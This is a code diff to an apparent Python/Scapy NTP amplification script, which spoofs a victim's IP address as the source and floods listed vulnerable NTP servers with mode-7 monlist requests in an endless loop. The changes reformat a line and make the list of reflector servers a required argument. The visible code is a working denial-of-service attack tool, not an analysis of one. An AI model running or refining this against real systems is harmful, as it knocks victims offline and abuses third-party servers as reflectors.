@@ -26,7 +26,7 @@ def ntp_amplification():
 	# Create the NTP request
 	ip = IP(src = g_target_ip)
 	udp = UDP(sport = RandShort(), dport = 123)
-	ntp = NTPPrivate(mode=7, implementation = "XNTPD", request_code="REQ_MON_GETLIST_1")
+	ntp = NTPPrivate(mode = 7, implementation = "XNTPD", request_code = "REQ_MON_GETLIST_1")
 
 	while True:
 		# Send the request to each of the NTP servers
@@ -46,12 +46,13 @@ def main():
 	args = parser.parse_args()
 
 	g_target_ip = args.t
+
 	if (g_target_ip == None):
 		sys.exit("[#] Please specify the target's IP address.\n[#] Exiting")
+	if (args.n == None):
+		sys.exit("[#] Please specify the vulnerable NTP server addresses.\n[#] Exiting")
 
-	if (args.n != None):
-		append_ntp_ips(args.n)
-
+	append_ntp_ips(args.n)
 
 	print("[*] Target IP: ", g_target_ip)
 	print("[*] NTP Servers: ", g_ntp_servers)
